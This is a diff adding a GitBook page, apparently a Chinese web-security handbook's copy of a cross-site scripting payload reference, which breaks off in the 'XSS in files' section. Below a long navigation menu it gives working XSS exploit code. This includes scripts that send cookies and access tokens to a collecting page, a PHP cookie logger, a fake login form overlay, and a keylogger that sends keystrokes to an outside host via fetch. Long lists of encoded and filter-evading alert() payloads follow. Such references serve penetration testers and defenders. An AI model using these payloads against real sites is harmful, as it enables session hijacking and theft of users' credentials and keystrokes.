@@ -1,0 +1,1573 @@
+
+<!DOCTYPE HTML>
+<html lang="" >
+    <head>
+        <meta charset="UTF-8">
+        <meta content="text/html; charset=utf-8" http-equiv="Content-Type">
+        <title>跨站脚本攻击-XSS · GitBook</title>
+        <meta http-equiv="X-UA-Compatible" content="IE=edge" />
+        <meta name="description" content="">
+        <meta name="generator" content="GitBook 3.2.3">
+        
+        
+        
+    
+    <link rel="stylesheet" href="../gitbook/style.css">
+
+    
+            
+                
+                <link rel="stylesheet" href="../gitbook/gitbook-plugin-highlight/website.css">
+                
+            
+                
+                <link rel="stylesheet" href="../gitbook/gitbook-plugin-search/search.css">
+                
+            
+                
+                <link rel="stylesheet" href="../gitbook/gitbook-plugin-fontsettings/website.css">
+                
+            
+        
+
+    
+
+    
+        
+    
+        
+    
+        
+    
+        
+    
+        
+    
+        
+    
+
+        
+    
+    
+    <meta name="HandheldFriendly" content="true"/>
+    <meta name="viewport" content="width=device-width, initial-scale=1, user-scalable=no">
+    <meta name="apple-mobile-web-app-capable" content="yes">
+    <meta name="apple-mobile-web-app-status-bar-style" content="black">
+    <link rel="apple-touch-icon-precomposed" sizes="152x152" href="../gitbook/images/apple-touch-icon-precomposed-152.png">
+    <link rel="shortcut icon" href="../gitbook/images/favicon.ico" type="image/x-icon">
+
+    
+    <link rel="next" href="../跨站请求伪造-CSRF/" />
+    
+    
+
+    </head>
+    <body>
+        
+<div class="book">
+    <div class="book-summary">
+        
+            
+<div id="book-search-input" role="search">
+    <input type="text" placeholder="Type to search" />
+</div>
+
+            
+                <nav role="navigation">
+                
+
+
+<ul class="summary">
+    
+    
+
+    
+
+    
+        
+        
+    
+        <li class="chapter " data-level="1.1" data-path="../">
+            
+                <a href="../">
+            
+                    
+                    简介
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="1.2" data-path="../SUMMARY.html">
+            
+                <a href="../SUMMARY.html">
+            
+                    
+                    目录
+            
+                </a>
+            
+
+            
+        </li>
+    
+
+    
+        
+        <li class="divider"></li>
+        
+        
+    
+        <li class="chapter " data-level="2.1" >
+            
+                <span>
+            
+                    
+                    注入漏洞
+            
+                </span>
+            
+
+            
+            <ul class="articles">
+                
+    
+        <li class="chapter " data-level="2.1.1" data-path="../命令注入/">
+            
+                <a href="../命令注入/">
+            
+                    
+                    命令注入
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="2.1.2" data-path="../SQL注入/">
+            
+                <a href="../SQL注入/">
+            
+                    
+                    SQL注入
+            
+                </a>
+            
+
+            
+            <ul class="articles">
+                
+    
+        <li class="chapter " data-level="2.1.2.1" data-path="../SQL注入/MYSQL.md">
+            
+                <span>
+            
+                    
+                    MYSQL
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="2.1.2.2" data-path="../SQL注入/MSSQL.html">
+            
+                <a href="../SQL注入/MSSQL.html">
+            
+                    
+                    MSSQL
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="2.1.2.3" data-path="../SQL注入/PostgreSQL.html">
+            
+                <a href="../SQL注入/PostgreSQL.html">
+            
+                    
+                    PostgreSQL
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="2.1.2.4" data-path="../SQL注入/SQLite.html">
+            
+                <a href="../SQL注入/SQLite.html">
+            
+                    
+                    SQLite
+            
+                </a>
+            
+
+            
+        </li>
+    
+
+            </ul>
+            
+        </li>
+    
+        <li class="chapter " data-level="2.1.3" data-path="../CRLF注入/">
+            
+                <a href="../CRLF注入/">
+            
+                    
+                    CRLF注入
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="2.1.4" data-path="../LDAP注入/">
+            
+                <a href="../LDAP注入/">
+            
+                    
+                    LDAP注入
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="2.1.5" data-path="../NOSQL注入/">
+            
+                <a href="../NOSQL注入/">
+            
+                    
+                    NOSQL注入
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="2.1.6" data-path="../XPATH注入/">
+            
+                <a href="../XPATH注入/">
+            
+                    
+                    XPATH注入
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="2.1.7" data-path="../SAML注入/">
+            
+                <a href="../SAML注入/">
+            
+                    
+                    SAML注入
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="2.1.8" data-path="../[XML实体注入漏洞-XXE">
+            
+                <span>
+            
+                    
+                    XML实体注入漏洞-XXE
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="2.1.9" data-path="../模板注入-SSTI/">
+            
+                <a href="../模板注入-SSTI/">
+            
+                    
+                    模板注入-SSTI
+            
+                </a>
+            
+
+            
+        </li>
+    
+
+            </ul>
+            
+        </li>
+    
+        <li class="chapter " data-level="2.2" >
+            
+                <span>
+            
+                    
+                    前端安全
+            
+                </span>
+            
+
+            
+            <ul class="articles">
+                
+    
+        <li class="chapter active" data-level="2.2.1" data-path="./">
+            
+                <a href="./">
+            
+                    
+                    跨站脚本攻击-XSS
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="2.2.2" data-path="../跨站请求伪造-CSRF/">
+            
+                <a href="../跨站请求伪造-CSRF/">
+            
+                    
+                    跨站请求伪造-CSRF
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="2.2.3" data-path="../CORS配置错误/">
+            
+                <a href="../CORS配置错误/">
+            
+                    
+                    CORS配置错误
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="2.2.4" data-path="../Web缓存泄露/">
+            
+                <a href="../Web缓存泄露/">
+            
+                    
+                    Web缓存泄露
+            
+                </a>
+            
+
+            
+        </li>
+    
+
+            </ul>
+            
+        </li>
+    
+        <li class="chapter " data-level="2.3" >
+            
+                <span>
+            
+                    
+                    权限控制
+            
+                </span>
+            
+
+            
+            <ul class="articles">
+                
+    
+        <li class="chapter " data-level="2.3.1" data-path="../不安全的代码管理/">
+            
+                <a href="../不安全的代码管理/">
+            
+                    
+                    不安全的代码管理
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="2.3.2" data-path="../不安全的对象引用/">
+            
+                <a href="../不安全的对象引用/">
+            
+                    
+                    不安全的对象引用
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="2.3.3" data-path="../不安全的管理接口/">
+            
+                <a href="../不安全的管理接口/">
+            
+                    
+                    不安全的管理接口
+            
+                </a>
+            
+
+            
+        </li>
+    
+
+            </ul>
+            
+        </li>
+    
+        <li class="chapter " data-level="2.4" >
+            
+                <span>
+            
+                    
+                    文件相关漏洞
+            
+                </span>
+            
+
+            
+            <ul class="articles">
+                
+    
+        <li class="chapter " data-level="2.4.1" data-path="../文件上传漏洞/">
+            
+                <a href="../文件上传漏洞/">
+            
+                    
+                    文件上传漏洞
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="2.4.2" data-path="../文件包含/README.md">
+            
+                <span>
+            
+                    
+                    文件包含
+            
+                </a>
+            
+
+            
+        </li>
+    
+
+            </ul>
+            
+        </li>
+    
+
+    
+        
+        <li class="divider"></li>
+        
+        
+    
+        <li class="chapter " data-level="3.1" >
+            
+                <span>
+            
+                    
+                    认证方式漏洞
+            
+                </span>
+            
+
+            
+            <ul class="articles">
+                
+    
+        <li class="chapter " data-level="3.1.1" data-path="../JWT安全问题/">
+            
+                <a href="../JWT安全问题/">
+            
+                    
+                    JWT安全问题
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="3.1.2" data-path="../OAuth认证/">
+            
+                <a href="../OAuth认证/">
+            
+                    
+                    OAuth认证
+            
+                </a>
+            
+
+            
+        </li>
+    
+
+            </ul>
+            
+        </li>
+    
+        <li class="chapter " data-level="3.2" >
+            
+                <span>
+            
+                    
+                    其他漏洞
+            
+                </span>
+            
+
+            
+            <ul class="articles">
+                
+    
+        <li class="chapter " data-level="3.2.1" data-path="../任意url跳转/">
+            
+                <a href="../任意url跳转/">
+            
+                    
+                    任意url跳转
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="3.2.2" data-path="../目录遍历/">
+            
+                <a href="../目录遍历/">
+            
+                    
+                    目录遍历
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="3.2.3" data-path="../服务端请求伪造-SSRF/">
+            
+                <a href="../服务端请求伪造-SSRF/">
+            
+                    
+                    服务端请求伪造-SSRF
+            
+                </a>
+            
+
+            
+        </li>
+    
+
+            </ul>
+            
+        </li>
+    
+
+    
+        
+        <li class="divider"></li>
+        
+        
+    
+        <li class="chapter " data-level="4.1" >
+            
+                <span>
+            
+                    
+                    代码审计
+            
+                </span>
+            
+
+            
+            <ul class="articles">
+                
+    
+        <li class="chapter " data-level="4.1.1" data-path="../PHP弱类型/">
+            
+                <a href="../PHP弱类型/">
+            
+                    
+                    PHP弱类型
+            
+                </a>
+            
+
+            
+        </li>
+    
+
+            </ul>
+            
+        </li>
+    
+        <li class="chapter " data-level="4.2" >
+            
+                <span>
+            
+                    
+                    内网渗透
+            
+                </span>
+            
+
+            
+            <ul class="articles">
+                
+    
+        <li class="chapter " data-level="4.2.1" data-path="../内网技巧/内网技巧.html">
+            
+                <a href="../内网技巧/内网技巧.html">
+            
+                    
+                    内网技巧
+            
+                </a>
+            
+
+            
+        </li>
+    
+
+            </ul>
+            
+        </li>
+    
+
+    
+
+    <li class="divider"></li>
+
+    <li>
+        <a href="https://www.gitbook.com" target="blank" class="gitbook-link">
+            Published with GitBook
+        </a>
+    </li>
+</ul>
+
+
+                </nav>
+            
+        
+    </div>
+
+    <div class="book-body">
+        
+            <div class="body-inner">
+                
+                    
+
+<div class="book-header" role="navigation">
+    
+
+    <!-- Title -->
+    <h1>
+        <i class="fa fa-circle-o-notch fa-spin"></i>
+        <a href=".." >跨站脚本攻击-XSS</a>
+    </h1>
+</div>
+
+
+
+
+                    <div class="page-wrapper" tabindex="-1" role="main">
+                        <div class="page-inner">
+                            
+<div id="book-search-results">
+    <div class="search-noresults">
+    
+                                <section class="normal markdown-section">
+                                
+                                <h1 id="cross-site-scripting">Cross Site Scripting</h1>
+<p>Cross-site scripting (XSS) is a type of computer security vulnerability typically found in web applications. XSS enables attackers to inject client-side scripts into web pages viewed by other users.</p>
+<h2 id="summary">Summary</h2>
+<ul>
+<li><a href="#exploit-code-or-poc">Exploit code or POC</a><ul>
+<li><a href="#data-grabber-for-xss">Data grabber for XSS</a></li>
+<li><a href="#ui-redressing">UI redressing</a></li>
+<li><a href="#javascript-keylogger">Javascript keylogger</a></li>
+<li><a href="#other-ways">Other ways</a></li>
+</ul>
+</li>
+<li><a href="#identify-an-xss-endpoint">Identify an XSS endpoint</a></li>
+<li><a href="#xss-in-htmlapplications">XSS in HTML/Applications</a></li>
+<li><a href="#xss-in-wrappers-javascript-and-data-uri">XSS in wrappers javascript and data URI</a></li>
+<li><a href="#xss-in-files">XSS in files (XML/SVG/CSS/Flash/Markdown)</a></li>
+<li><a href="#xss-in-postmessage">XSS in PostMessage</a></li>
+<li><a href="#blind-xss">Blind XSS</a><ul>
+<li><a href="#xss-hunter">XSS Hunter</a></li>
+<li><a href="#other-blind-xss-tools">Other Blind XSS tools</a></li>
+<li><a href="#blind-xss-endpoint">Blind XSS endpoint</a></li>
+</ul>
+</li>
+<li><a href="#polyglot-xss">Polyglot XSS</a></li>
+<li><a href="#filter-bypass-and-exotic-payloads">Filter Bypass and Exotic payloads</a><ul>
+<li><a href="#bypass-case-sensitive">Bypass case sensitive</a></li>
+<li><a href="#bypass-tag-blacklist">Bypass tag blacklist</a></li>
+<li><a href="#bypass-word-blacklist-with-code-evaluation">Bypass word blacklist with code evaluation</a></li>
+<li><a href="#bypass-with-incomplete-html-tag">Bypass with incomplete html tag</a></li>
+<li><a href="#bypass-quotes-for-string">Bypass quotes for string</a></li>
+<li><a href="#bypass-quotes-in-script-tag">Bypass quotes in script tag</a></li>
+<li><a href="#bypass-quotes-in-mousedown-event">Bypass quotes in mousedown event</a></li>
+<li><a href="#bypass-dot-filter">Bypass dot filter</a></li>
+<li><a href="#bypass-parenthesis-for-string">Bypass parenthesis for string</a></li>
+<li><a href="#bypass-parenthesis-and-semi-colon">Bypass parenthesis and semi colon</a></li>
+<li><a href="#bypass-onxxxx---blacklist">Bypass onxxxx= blacklist</a></li>
+<li><a href="#bypass-space-filter">Bypass space filter</a></li>
+<li><a href="#bypass-email-filter">Bypass email filter</a></li>
+<li><a href="#bypass-document-blacklist">Bypass document blacklist</a></li>
+<li><a href="#bypass-using-javascript-inside-a-string">Bypass using javascript inside a string</a></li>
+<li><a href="#bypass-unsing-an-alternate-way-to-redirect">Bypass using an alternate way to redirect</a></li>
+<li><a href="#bypass-using-an-alternate-way-to-execute-an-alert">Bypass using an alternate way to execute an alert</a></li>
+<li><a href="#bypass----using-nothing">Bypass &quot;&gt;&quot; using nothing</a></li>
+<li><a href="#bypass-using------using-another-character">Bypass &quot;;&quot; using another character</a></li>
+<li><a href="#bypass-using-html-encoding">Bypass using HTML encoding</a></li>
+<li><a href="#bypass-using-katana">Bypass using Katana</a></li>
+<li><a href="#bypass-using-lontara">Bypass using Lontara</a></li>
+<li><a href="#bypass-using-ecmascript6">Bypass using ECMAScript6</a></li>
+<li><a href="#bypass-using-octal-encoding">Bypass using Octal encoding</a></li>
+<li><a href="#bypass-using-unicode">Bypass using Unicode</a></li>
+<li><a href="#bypass-using-utf---7">Bypass using UTF-7</a></li>
+<li><a href="#bypass-using-utf---8">Bypass using UTF-8</a></li>
+<li><a href="#bypass-using-utf---16be">Bypass using UTF-16be</a></li>
+<li><a href="#bypass-using-utf---32">Bypass using UTF-32</a></li>
+<li><a href="#bypass-using-bom">Bypass using BOM</a></li>
+<li><a href="#bypass-using-weird-encoding-or-native-interpretation">Bypass using weird encoding or native interpretation</a></li>
+</ul>
+</li>
+<li><a href="#csp-bypass">CSP Bypass</a></li>
+<li><a href="#common-waf-bypass">Common WAF Bypass</a></li>
+</ul>
+<h2 id="exploit-code-or-poc">Exploit code or POC</h2>
+<h3 id="data-grabber-for-xss">Data grabber for XSS</h3>
+<p>Obtains the administrator cookie or sensitive access token, the following payload will send it to a controlled page.</p>
+<pre><code class="lang-html"><span class="hljs-tag">&lt;<span class="hljs-name">script</span>&gt;</span><span class="javascript"><span class="hljs-built_in">document</span>.location=<span class="hljs-string">&apos;http://localhost/XSS/grabber.php?c=&apos;</span>+<span class="hljs-built_in">document</span>.cookie</span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span>
+<span class="hljs-tag">&lt;<span class="hljs-name">script</span>&gt;</span><span class="javascript"><span class="hljs-built_in">document</span>.location=<span class="hljs-string">&apos;http://localhost/XSS/grabber.php?c=&apos;</span>+localStorage.getItem(<span class="hljs-string">&apos;access_token&apos;</span>)</span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span>
+<span class="hljs-tag">&lt;<span class="hljs-name">script</span>&gt;</span><span class="javascript"><span class="hljs-keyword">new</span> Image().src=<span class="hljs-string">&quot;http://localhost/cookie.php?c=&quot;</span>+<span class="hljs-built_in">document</span>.cookie;</span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span>
+<span class="hljs-tag">&lt;<span class="hljs-name">script</span>&gt;</span><span class="actionscript"><span class="hljs-keyword">new</span> Image().src=<span class="hljs-string">&quot;http://localhost/cookie.php?c=&quot;</span>+localStorage.getItem(<span class="hljs-string">&apos;access_token&apos;</span>);</span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span>
+</code></pre>
+<p>Write the collected data into a file.</p>
+<pre><code class="lang-php"><span class="hljs-meta">&lt;?php</span>
+$cookie = $_GET[<span class="hljs-string">&apos;c&apos;</span>];
+$fp = fopen(<span class="hljs-string">&apos;cookies.txt&apos;</span>, <span class="hljs-string">&apos;a+&apos;</span>);
+fwrite($fp, <span class="hljs-string">&apos;Cookie:&apos;</span> .$cookie.<span class="hljs-string">&apos;\r\n&apos;</span>);
+fclose($fp);
+<span class="hljs-meta">?&gt;</span>
+</code></pre>
+<h3 id="ui-redressing">UI redressing</h3>
+<p>Leverage the XSS to modify the HTML content of the page in order to display a fake login form.</p>
+<pre><code class="lang-html"><span class="hljs-tag">&lt;<span class="hljs-name">script</span>&gt;</span><span class="handlebars"><span class="xml">
+history.replaceState(null, null, &apos;../../../login&apos;);
+document.body.innerHTML = &quot;<span class="hljs-tag">&lt;/<span class="hljs-name">br</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">br</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">br</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">br</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">br</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">h1</span>&gt;</span>Please login to continue<span class="hljs-tag">&lt;/<span class="hljs-name">h1</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">form</span>&gt;</span>Username: <span class="hljs-tag">&lt;<span class="hljs-name">input</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&apos;text&apos;</span>&gt;</span>Password: <span class="hljs-tag">&lt;<span class="hljs-name">input</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&apos;password&apos;</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">form</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">input</span> <span class="hljs-attr">value</span>=<span class="hljs-string">&apos;submit&apos;</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&apos;submit&apos;</span>&gt;</span>&quot;
+</span></span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span>
+</code></pre>
+<h3 id="javascript-keylogger">Javascript keylogger</h3>
+<p>Another way to collect sensitive data is to set a javascript keylogger.</p>
+<pre><code class="lang-javascript">&lt;img src=x onerror=<span class="hljs-string">&apos;document.onkeypress=function(e){fetch(&quot;http://domain.com?k=&quot;+String.fromCharCode(e.which))},this.remove();&apos;</span>&gt;
+</code></pre>
+<h3 id="other-ways">Other ways</h3>
+<p>More exploits at <a href="http://www.xss-payloads.com/payloads-list.html?a#category=all" target="_blank">http://www.xss-payloads.com/payloads-list.html?a#category=all</a>:</p>
+<ul>
+<li><a href="https://www.idontplaydarts.com/2012/04/taking-screenshots-using-xss-and-the-html5-canvas/" target="_blank">Taking screenshots using XSS and the HTML5 Canvas</a></li>
+<li><a href="http://www.gnucitizen.org/blog/javascript-port-scanner/" target="_blank">JavaScript Port Scanner</a></li>
+<li><a href="http://www.xss-payloads.com/payloads/scripts/websocketsnetworkscan.js.html" target="_blank">Network Scanner</a></li>
+<li><a href="http://www.xss-payloads.com/payloads/scripts/dotnetexec.js.html" target="_blank">.NET Shell execution</a></li>
+<li><a href="http://www.xss-payloads.com/payloads/scripts/redirectform.js.html" target="_blank">Redirect Form</a></li>
+<li><a href="http://www.xss-payloads.com/payloads/scripts/playmusic.js.html" target="_blank">Play Music</a></li>
+</ul>
+<h2 id="identify-an-xss-endpoint">Identify an XSS endpoint</h2>
+<pre><code class="lang-javascript">&lt;script&gt;<span class="hljs-keyword">debugger</span>;<span class="xml"><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span></span>
+</code></pre>
+<h2 id="xss-in-htmlapplications">XSS in HTML/Applications</h2>
+<p>XSS Basic</p>
+<pre><code class="lang-javascript">Basic payload
+&lt;script&gt;alert(&apos;XSS&apos;)&lt;/script&gt;
+&lt;scr&lt;script&gt;ipt&gt;alert(&apos;XSS&apos;)&lt;/scr&lt;script&gt;ipt&gt;
+&quot;&gt;&lt;script&gt;alert(&apos;XSS&apos;)&lt;/script&gt;
+&quot;&gt;&lt;script&gt;alert(String.fromCharCode(88,83,83))&lt;/script&gt;
+
+Img payload
+&lt;img src=x onerror=alert(&apos;XSS&apos;);&gt;
+&lt;img src=x onerror=alert(&apos;XSS&apos;)//
+&lt;img src=x onerror=alert(String.fromCharCode(88,83,83));&gt;
+&lt;img src=x oneonerrorrror=alert(String.fromCharCode(88,83,83));&gt;
+&lt;img src=x:alert(alt) onerror=eval(src) alt=xss&gt;
+&quot;&gt;&lt;img src=x onerror=alert(&apos;XSS&apos;);&gt;
+&quot;&gt;&lt;img src=x onerror=alert(String.fromCharCode(88,83,83));&gt;
+
+Svg payload
+&lt;svgonload=alert(1)&gt;
+&lt;svg/onload=alert(&apos;XSS&apos;)&gt;
+&lt;svg onload=alert(1)//
+&lt;svg/onload=alert(String.fromCharCode(88,83,83))&gt;
+&lt;svg id=alert(1) onload=eval(id)&gt;
+&quot;&gt;&lt;svg/onload=alert(String.fromCharCode(88,83,83))&gt;
+&quot;&gt;&lt;svg/onload=alert(/XSS/)
+
+Div payload
+&lt;div onpointerover=&quot;alert(45)&quot;&gt;MOVE HERE&lt;/div&gt;
+&lt;div onpointerdown=&quot;alert(45)&quot;&gt;MOVE HERE&lt;/div&gt;
+&lt;div onpointerenter=&quot;alert(45)&quot;&gt;MOVE HERE&lt;/div&gt;
+&lt;div onpointerleave=&quot;alert(45)&quot;&gt;MOVE HERE&lt;/div&gt;
+&lt;div onpointermove=&quot;alert(45)&quot;&gt;MOVE HERE&lt;/div&gt;
+&lt;div onpointerout=&quot;alert(45)&quot;&gt;MOVE HERE&lt;/div&gt;
+&lt;div onpointerup=&quot;alert(45)&quot;&gt;MOVE HERE&lt;/div&gt;
+</code></pre>
+<p>XSS for HTML5</p>
+<pre><code class="lang-javascript">&lt;body onload=alert(<span class="hljs-regexp">/XSS/</span>.source)&gt;
+&lt;input autofocus onfocus=alert(1)&gt;
+&lt;select autofocus onfocus=alert(1)&gt;
+&lt;textarea autofocus onfocus=alert(1)&gt;
+&lt;keygen autofocus onfocus=alert(1)&gt;
+&lt;video/poster/onerror=alert(1)&gt;
+&lt;video&gt;&lt;source onerror=&quot;javascript:alert(1)&quot;&gt;
+&lt;video src=_ onloadstart=&quot;alert(1)&quot;&gt;
+&lt;details/open/ontoggle=&quot;alert`1`&quot;&gt;
+&lt;audio src onloadstart=alert(1)&gt;
+&lt;marquee onstart=alert(1)&gt;
+&lt;meter value=2 min=0 max=10 onmouseover=alert(1)&gt;2 out of 10&lt;/meter&gt;
+
+&lt;body ontouchstart=alert(1)&gt; // Triggers when a finger touch the screen
+&lt;body ontouchend=alert(1)&gt;   // Triggers when a finger is removed from touch screen
+&lt;body ontouchmove=alert(1)&gt;  // When a finger is dragged across the screen.
+</code></pre>
+<p>XSS using script tag (external payload)</p>
+<pre><code class="lang-javascript">&lt;script src=14.rs&gt;
+you can also specify an arbitratry payload with 14.rs/#payload
+e.g: 14.rs/#alert(document.domain)
+</code></pre>
+<p>XSS in Hidden input</p>
+<pre><code class="lang-javascript">&lt;input type=<span class="hljs-string">&quot;hidden&quot;</span> accesskey=<span class="hljs-string">&quot;X&quot;</span> onclick=<span class="hljs-string">&quot;alert(1)&quot;</span>&gt;
+Use CTRL+SHIFT+X to trigger the onclick event
+</code></pre>
+<p>DOM XSS</p>
+<pre><code class="lang-javascript">#&quot;&gt;&lt;img src=/ onerror=alert(2)&gt;
+</code></pre>
+<p>XSS in JS Context (payload without quote/double quote from <a href="https://twitter.com/brutelogic" target="_blank">@brutelogic</a></p>
+<pre><code class="lang-javascript">-(confirm)(<span class="hljs-built_in">document</span>.domain)<span class="hljs-comment">//</span>
+; alert(<span class="hljs-number">1</span>);<span class="hljs-comment">//</span>
+</code></pre>
+<p>XSS URL</p>
+<pre><code class="lang-javascript">URL/&lt;svg onload=alert(1)&gt;
+URL/&lt;script&gt;alert(&apos;XSS&apos;);//
+URL/&lt;input autofocus onfocus=alert(1)&gt;
+</code></pre>
+<h2 id="xss-in-wrappers-javascript-and-data-uri">XSS in wrappers javascript and data URI</h2>
+<p>XSS with javascript:</p>
+<pre><code class="lang-javascript">javascript:prompt(1)
+
+%26%23106%26%2397%26%23118%26%2397%26%23115%26%2399%26%23114%26%23105%26%23112%26%23116%26%2358%26%2399%26%23111%26%23110%26%23102%26%23105%26%23114%26%23109%26%2340%26%2349%26%2341
+
+&amp;#106&amp;#97&amp;#118&amp;#97&amp;#115&amp;#99&amp;#114&amp;#105&amp;#112&amp;#116&amp;#58&amp;#99&amp;#111&amp;#110&amp;#102&amp;#105&amp;#114&amp;#109&amp;#40&amp;#49&amp;#41
+
+We can encode the &quot;javacript:&quot; in Hex/Octal
+\x6A\x61\x76\x61\x73\x63\x72\x69\x70\x74\x3aalert(1)
+\u006A\u0061\u0076\u0061\u0073\u0063\u0072\u0069\u0070\u0074\u003aalert(1)
+\152\141\166\141\163\143\162\151\160\164\072alert(1)
+
+We can use a &apos;newline character&apos;
+java%0ascript:alert(1)   - LF (\n)
+java%09script:alert(1)   - Horizontal tab (\t)
+java%0dscript:alert(1)   - CR (\r)
+
+Using the escape character
+\j\av\a\s\cr\i\pt\:\a\l\ert\(1\)
+
+Using the newline and a comment //
+javascript://%0Aalert(1)
+javascript://anything%0D%0A%0D%0Awindow.alert(1)
+</code></pre>
+<p>XSS with data:</p>
+<pre><code class="lang-javascript">data:text/html,<span class="xml"><span class="hljs-tag">&lt;<span class="hljs-name">script</span>&gt;</span><span class="undefined">alert(0)</span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span></span>
+data:text/html;base64,PHN2Zy9vbmxvYWQ9YWxlcnQoMik+
+<span class="xml"><span class="hljs-tag">&lt;<span class="hljs-name">script</span> <span class="hljs-attr">src</span>=<span class="hljs-string">&quot;data:;base64,YWxlcnQoZG9jdW1lbnQuZG9tYWluKQ==&quot;</span>&gt;</span><span class="undefined"></span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span></span>
+</code></pre>
+<p>XSS with vbscript: only IE</p>
+<pre><code class="lang-javascript">vbscript:msgbox(<span class="hljs-string">&quot;XSS&quot;</span>)
+</code></pre>
+<h2 id="xss-in-files">XSS in files</h2>
+<p><strong> NOTE:</strong> The XML CDATA section is used here so that the JavaScript payload will not be treated as XML markup.</p>
+<pre><code class="lang-xml"><span class="hljs-tag">&lt;<span class="hljs-name">name</span>&gt;</span>
+  <span class="hljs-tag">&lt;<span class="hljs-name">value</span>&gt;</span>&lt;![CDATA[&lt;script&gt;confirm(document.domain)&lt;/script&gt;]]&gt;<span class="hljs-tag">&lt;/<span class="hljs-name">value</span>&gt;</span>
+<span class="hljs-tag">&lt;/<span class="hljs-name">name</span>&gt;</span>
+</code></pre>
+<h3 id="xss-in-xml">XSS in XML</h3>
+<pre><code class="lang-xml"><span class="hljs-tag">&lt;<span class="hljs-name">html</span>&gt;</span>
+<span class="hljs-tag">&lt;<span class="hljs-name">head</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">head</span>&gt;</span>
+<span class="hljs-tag">&lt;<span class="hljs-name">body</span>&gt;</span>
+<span class="hljs-tag">&lt;<span class="hljs-name">something:script</span> <span class="hljs-attr">xmlns:something</span>=<span class="hljs-string">&quot;http://www.w3.org/1999/xhtml&quot;</span>&gt;</span>alert(1)<span class="hljs-tag">&lt;/<span class="hljs-name">something:script</span>&gt;</span>
+<span class="hljs-tag">&lt;/<span class="hljs-name">body</span>&gt;</span>
+<span class="hljs-tag">&lt;/<span class="hljs-name">html</span>&gt;</span>
+</code></pre>
+<h3 id="xss-in-svg">XSS in SVG</h3>
+<pre><code class="lang-xml"><span class="php"><span class="hljs-meta">&lt;?</span>xml version=<span class="hljs-string">&quot;1.0&quot;</span> standalone=<span class="hljs-string">&quot;no&quot;</span><span class="hljs-meta">?&gt;</span></span>
+<span class="hljs-meta">&lt;!DOCTYPE svg PUBLIC &quot;-//W3C//DTD SVG 1.1//EN&quot; &quot;http://www.w3.org/Graphics/SVG/1.1/DTD/svg11.dtd&quot;&gt;</span>
+
+<span class="hljs-tag">&lt;<span class="hljs-name">svg</span> <span class="hljs-attr">version</span>=<span class="hljs-string">&quot;1.1&quot;</span> <span class="hljs-attr">baseProfile</span>=<span class="hljs-string">&quot;full&quot;</span> <span class="hljs-attr">xmlns</span>=<span class="hljs-string">&quot;http://www.w3.org/2000/svg&quot;</span>&gt;</span>
+  <span class="hljs-tag">&lt;<span class="hljs-name">polygon</span> <span class="hljs-attr">id</span>=<span class="hljs-string">&quot;triangle&quot;</span> <span class="hljs-attr">points</span>=<span class="hljs-string">&quot;0,0 0,50 50,0&quot;</span> <span class="hljs-attr">fill</span>=<span class="hljs-string">&quot;#009900&quot;</span> <span class="hljs-attr">stroke</span>=<span class="hljs-string">&quot;#004400&quot;</span>/&gt;</span>
+  <span class="hljs-tag">&lt;<span class="hljs-name">script</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;text/javascript&quot;</span>&gt;</span><span class="javascript">
+    alert(<span class="hljs-built_in">document</span>.domain);
+  </span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span>
+<span class="hljs-tag">&lt;/<span class="hljs-name">svg</span>&gt;</span>
+</code></pre>
+<h3 id="xss-in-svg-short">XSS in SVG (short)</h3>
+<pre><code class="lang-javascript">&lt;svg xmlns=<span class="hljs-string">&quot;http://www.w3.org/2000/svg&quot;</span> onload=<span class="hljs-string">&quot;alert(document.domain)&quot;</span>/&gt;
+
